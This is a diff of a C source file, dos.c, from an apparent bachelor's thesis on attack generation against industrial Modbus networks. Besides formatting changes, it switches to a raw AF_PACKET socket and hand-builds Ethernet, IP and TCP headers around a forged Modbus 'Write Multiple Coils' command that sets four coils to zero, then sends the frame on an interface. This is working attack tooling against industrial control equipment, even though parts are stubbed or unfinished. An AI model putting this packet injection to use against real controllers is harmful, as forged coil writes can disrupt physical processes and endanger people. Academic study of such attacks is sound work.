@@ -1,88 +1,131 @@
-// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
+// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network
 // File:        dos.c
 // Author:      Jakub Kuzník, FIT
-//  
+//
 
 // Execution:
 
 #include "dos.h"
 
+int main(void)
+{
 
-int main(void){
-  
-  // Modbus TCP packet 
+  // Modbus TCP packet
   modbusPacket mPacket;
   char packetRawForm[PACKET_SIZE];
-  
+
   // output interface
   struct ifreq interface;
-  
-  srand(time(NULL));   // rand nums init.
 
+  srand(time(NULL)); // rand nums init.
 
-  int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-  if (rawSocket < 0) 
+  int rawSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+  if (rawSocket < 0)
     goto error1;
 
-  // bind raw socket to specific interface 
-  if (setsockopt(rawSocket, SOL_SOCKET, SO_BINDTODEVICE, 
-        OUT_INTERFACE, sizeof(OUT_INTERFACE)) != 0)
-    goto error2;
+// get index of network interface named "eno2"
+  int ifIndex = if_nametoindex(OUT_INTERFACE);
+  if (ifIndex == 0) {
+    fprintf(stderr, "Can't get network interface index");
+    exit(1);
+  }
+
+  // bind socket to network interface
+  struct sockaddr_ll sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sll_family = AF_PACKET;
+  sa.sll_protocol = htons(ETH_P_ALL);
+  sa.sll_ifindex = ifIndex; 
+  if (bind(rawSocket, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+    fprintf(stderr, "Can't bind socket to interface");
+    exit(1);
+  }
+
   
-  // builds modbus packet to modbusPacket struct 
+
+
+  // bind raw socket to specific interface
+
+//  if (setsockopt(rawSocket, SOL_SOCKET, SO_BINDTODEVICE,
+//                 OUT_INTERFACE, sizeof(OUT_INTERFACE)) != 0)
+//    goto error2;
+
+
+  // set the MSG_DONTROUTE flag
+  // sent packets dirrctly to interface without doing routing
+  // int enable = 1;
+  // if (setsockopt(rawSocket, IPPROTO_IP, IP_MTU_DISCOVER, &enable, sizeof(enable)) < 0) {
+  // fprintf(stderr, "Erorr fail to set MSG_DONTROUTE flag\n");
+  // return 1;
+  //}
+
+  // builds modbus packet to modbusPacket struct
   // todo maybe modifyTcpParams()
   buildModbusPacket(&mPacket);
   packetToCharArray(packetRawForm, &mPacket);
 
-  for (int i = 0; i < PACKET_SIZE; i++){
-    printf("%02hhX ",packetRawForm[i]);
+  for (int i = 0; i < PACKET_SIZE; i++)
+  {
+    printf("%02hhX ", packetRawForm[i]);
   }
 
-  if ((sendPacket(rawSocket, mPacket, &interface)) != 0)
-    goto error3;
+  // send the data over the raw socket
+  int ret = send(rawSocket, packetRawForm, PACKET_SIZE, 0);
+  if (ret < 0)
+  {
+    fprintf(stderr, "ERROR send() %d Sending data failed \n", ret);
+    while (1)
+    {
+    }
+
+    return 1;
+  }
+
+  // if ((sendPacket(rawSocket, mPacket, &interface)) != 0)
+  // goto error3;
 
   // todo free modbusPayload->data
   close(rawSocket);
   return 0;
 
-
-
 error1:
   fprintf(stderr, "Error can't create raw socket\n");
-  return 1; 
+  return 1;
 
 error2:
   fprintf(stderr, "Error Can't bind socket to interface\n");
-  return 2; 
+  return 2;
 
 error3:
   fprintf(stderr, "Error \n");
-  return 2; 
+  return 2;
 }
 
 /**
- * @brief Function will send mPacket to sock 
- * @param sock output socket 
- * @return false if error sending 
+ * @brief Function will send mPacket to sock
+ * @param sock output socket
+ * @return false if error sending
  */
-int sendPacket(int sock, modbusPacket mPacket, 
-                struct ifreq * interface ){
-   
+int sendPacket(int sock, modbusPacket mPacket,
+               struct ifreq *interface)
+{
+
   return 0;
 }
 
 /**
- * @brief build packet byte by byte to char array. 
+ * @brief build packet byte by byte to char array.
  */
-void packetToCharArray(char out[PACKET_SIZE], modbusPacket * mPacket){
-    
-  char * pt = &out[0]; // pointer to first element of array 
+void packetToCharArray(char out[PACKET_SIZE], modbusPacket *mPacket)
+{
 
-  // eth header    
+  char *pt = &out[0]; // pointer to first element of array
+
+  // eth header
   memcpy(pt, &mPacket->ethHeader, ETH_HEADER_SIZE);
   pt += ETH_HEADER_SIZE;
 
-  // ip header 
+  // ip header
   memcpy(pt, &mPacket->ipHeader, IP_HEADER_SIZE);
   pt += IP_HEADER_SIZE;
 
@@ -103,55 +146,59 @@ void packetToCharArray(char out[PACKET_SIZE], modbusPacket * mPacket){
  * @brief Function create modbus packet.
  * it uses constants from dos.h to fill eth/ip/tcp headers.
  */
-void buildModbusPacket(modbusPacket * mPacket){
+void buildModbusPacket(modbusPacket *mPacket)
+{
 
-  // create eth/ip/tcp headers and store inside mPacket struct. 
+  // create eth/ip/tcp headers and store inside mPacket struct.
   createEthHeader(&mPacket->ethHeader);
   createIpHeader(&mPacket->ipHeader);
   createTcpHeader(&mPacket->tcpHeader);
 
-  // TODO maybe we need to calculate ip checksum 
-  
-  // create Modbus part of packet 
+  // TODO maybe we need to calculate ip checksum
+
+  // create Modbus part of packet
   // good to realize that modbusH->lenght tell us lenght in bytes
-  //   from unitId to end of data 
+  //   from unitId to end of data
   createModbusHeader(&mPacket->modbusH);
   createModbusPayload(&mPacket->modbusP);
 }
 
 /**
- * @brief Create a Modbus Payload. 
+ * @brief Create a Modbus Payload.
  */
-void createModbusPayload(modbusPayload * mPayload){
+void createModbusPayload(modbusPayload *mPayload)
+{
   mPayload->functionCode = 15; // Write Multiple Coils
   mPayload->data = malloc(6);
 
-  // reference number 0 
+  // reference number 0
   mPayload->data[0] = 0;
   mPayload->data[1] = 0;
   // bit count 4
   mPayload->data[2] = 0;
-  mPayload->data[3] = 4; 
+  mPayload->data[3] = 4;
   // byte count 1
   mPayload->data[4] = 1;
   // data 0
-  mPayload->data[5] = 0; 
+  mPayload->data[5] = 0;
 }
 
 /**
  * @brief Create a Modbus Header.
  */
-void createModbusHeader(modbusHeader * mHeader){
-  mHeader->transactionId = htons(rand()); 
+void createModbusHeader(modbusHeader *mHeader)
+{
+  mHeader->transactionId = htons(rand());
   mHeader->protocolId = htons(0);
   mHeader->lenght = htons(8);
   mHeader->unitId = 1;
 }
 
 /**
- * @brief It builds tcp header using constants from dos.h 
+ * @brief It builds tcp header using constants from dos.h
  */
-void createTcpHeader(struct tcphdr * tcpHeader){
+void createTcpHeader(struct tcphdr *tcpHeader)
+{
   tcpHeader->source = htons(TCP_SRC_PORT);
   tcpHeader->dest = htons(TCP_DST_PORT);
   tcpHeader->seq = htonl((uint32_t)rand());
@@ -164,13 +211,14 @@ void createTcpHeader(struct tcphdr * tcpHeader){
 }
 
 /**
- * @brief it builds ipv4 header using constants from dos.h 
+ * @brief it builds ipv4 header using constants from dos.h
  */
-void createIpHeader(struct iphdr * ipHeader){
+void createIpHeader(struct iphdr *ipHeader)
+{
   ipHeader->ihl = 5;
   ipHeader->version = 4;
   ipHeader->tos = 0;
-  // for different packets there should be change 
+  // for different packets there should be change
   ipHeader->tot_len = IP_HEADER_TOTAL_LENGHT;
   ipHeader->id = htons(12345);
   ipHeader->frag_off = 0;
@@ -182,31 +230,35 @@ void createIpHeader(struct iphdr * ipHeader){
 }
 
 /**
- * @brief it builds ethernet header using. constants from dos.h 
+ * @brief it builds ethernet header using. constants from dos.h
  */
-void createEthHeader(struct ether_header * ethHeader){
+void createEthHeader(struct ether_header *ethHeader)
+{
 
-  unsigned char srcMac[6], dstMac[6]; 
-    
+  unsigned char srcMac[6], dstMac[6];
+
   convertMac(srcMac, MAC_SRC);
   convertMac(dstMac, MAC_DST);
-  
-  // copy MAC to header byte by byte 
-  for (int i = 0; i < 6; i++){
-    ethHeader->ether_dhost[i] = dstMac[i]; 
+
+  // copy MAC to header byte by byte
+  for (int i = 0; i < 6; i++)
+  {
+    ethHeader->ether_dhost[i] = dstMac[i];
     ethHeader->ether_shost[i] = srcMac[i];
   }
-  ethHeader->ether_type = htons(ETHERTYPE_IP); 
+  ethHeader->ether_type = htons(ETHERTYPE_IP);
 }
 
 /**
  * @brief it converts mac address from const char "aa:aa:bb:bb:cc:cc"
- *  to unsigned char out[6] 
+ *  to unsigned char out[6]
  */
-void convertMac(unsigned char out[6], const char * macStr){
+void convertMac(unsigned char out[6], const char *macStr)
+{
   if (sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
              &out[0], &out[1], &out[2],
-             &out[3], &out[4], &out[5]) != 6) {
+             &out[3], &out[4], &out[5]) != 6)
+  {
     fprintf(stderr, "Can't convert MAC addres\n");
-  } 
+  }
 }
